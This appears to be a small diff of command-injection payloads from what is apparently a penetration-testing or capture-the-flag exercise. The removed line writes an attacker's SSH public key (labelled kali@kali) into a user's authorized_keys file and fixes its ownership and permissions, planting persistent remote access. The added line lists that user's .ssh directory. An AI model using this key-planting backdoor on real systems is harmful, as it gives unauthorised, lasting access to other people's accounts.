@@ -1,2 +1,1 @@
-<pre>system('echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDFyT8eS7Tt5HekvjolzuTKKxpVkwOE46i3+UEOJizGEITaikcnMDebRQQL4kiZkMjp7Xt+Wiu/+f2MsybAkKUtRLg8L2eMtc9NM2RAua4BydiFQkTqyUNffrVLpcRkKZgwHCMsCgH3H5hRLc8EsnJUg7IjJUK/KZSLFXhEcKHDMJx+G4PlXNatQ4U/1vp3LQR9RgvEUT+LcwMYBJrzdehPHPz0uyTnK/jRB8JtUiR6cnX9PXS2d14oqsn7eEdquXxdZMfv9A3H/OtKV5Q8rukdHyRToKAisiiFJ4vmUXyqX8v2N3anlREe9I1mz94/ybFbtRNut0rhEcQctEUG8Cjd6vXH+/lg2odBzQG5Zi8zTOMUzFpgoIosMYLZCj5X2bYgHE+cJmbyakQbHqWuNCMwal3VHJchZo5j36eiiXpc54BjsSlj20cAP+ZL0R3GPLrCvCGADjy2O5lYNOeFW/gTWDwm+1BGLLpf2xhUKEi8NfvP8nVM8Py5dJCQKwfHA5M= kali@kali
-" > /home/takis/.ssh/authorized_keys && chown takis:takis /home/takis/.ssh/authorized_keys && chmod 664 /home/takis/.ssh/authorized_keys')</pre>
+<pre>system('ls -al /home/takis/.ssh')</pre>
